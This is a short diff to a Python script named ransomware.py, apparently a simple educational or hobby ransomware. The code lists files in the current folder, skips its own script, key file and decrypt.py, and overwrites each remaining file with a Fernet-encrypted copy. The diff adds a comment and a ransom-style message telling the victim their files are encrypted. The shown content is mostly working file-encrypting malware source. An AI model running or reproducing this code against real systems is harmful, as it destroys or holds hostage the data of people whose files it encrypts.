@@ -8,6 +8,7 @@ files = []
 for file in os.listdir():
     if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
         continue
+    # Encrypt only the files inside the folder, not the sub folder
     if os.path.isfile(file):
         files.append(file)
 
@@ -25,3 +26,5 @@ for file in files:
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
+
+print("All of your files have been encrypted!! Find the magic word to decrypt them")
